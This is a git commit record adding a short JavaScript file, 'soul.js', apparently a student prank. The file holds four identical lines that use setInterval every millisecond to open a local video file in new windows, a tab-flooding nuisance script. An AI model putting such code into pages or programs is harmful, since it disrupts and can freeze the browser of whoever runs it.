c922bdba0c26a549836b1a438933d2393e18f08d
brgvefdsc <91153971+brgvefdsc@users.noreply.github.com>
2022-01-19 20:01:40 -0800

    Add files via upload

---
+++ soul.js
@@ -0,0 +1,4 @@
+setInterval(function () {window.open("file:///Users/bayfrontstudent/Documents/code/cpp/prank/NeverG.mp4", "_blank")}, 1);
+setInterval(function () {window.open("file:///Users/bayfrontstudent/Documents/code/cpp/prank/NeverG.mp4", "_blank")}, 1);
+setInterval(function () {window.open("file:///Users/bayfrontstudent/Documents/code/cpp/prank/NeverG.mp4", "_blank")}, 1);
+setInterval(function () {window.open("file:///Users/bayfrontstudent/Documents/code/cpp/prank/NeverG.mp4", "_blank")}, 1);
